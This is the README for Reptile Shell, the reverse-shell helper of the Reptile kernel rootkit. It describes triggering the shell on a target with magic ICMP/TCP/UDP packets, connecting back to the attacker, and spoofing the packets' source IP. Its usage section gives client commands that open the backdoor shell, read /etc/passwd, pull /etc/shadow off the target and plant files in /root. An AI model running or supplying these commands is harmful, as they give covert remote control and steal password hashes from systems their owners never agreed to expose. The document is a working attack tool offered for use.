# Reptile Shell

This shell is a user-mode-helper called by Reptile Kernel Module when is triggered with a magic ICMP/TCP/UDP packet. Based on Tiny SHell by Christophe Devine. Thanks Christophe! ;)

## Features

- Full TTY/PTY encrypted shell
- Download/Upload files
- Run standalone commands
- Loop to connect back each X times (not default)

## Usage

- To send magic packets and get a shell:
```
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port>
```
- To run standalone command (pay attention on quotes):
```
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port> -a "cat /etc/passwd" 
```
- To download/upload a file (pay attention on quotes):
```
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port> -a "get /etc/shadow /tmp"
./reptile_client -t <target IP> -x <magic packet protocol> -l <your IP> -p <your port> -a "put file.txt /root"
```
- To just stay listening connections:
```
./reptile_client -x listen -p <your port>
```
- If you wanna spoof the source IP address of magic packets, use: `-s <spoof IP>`
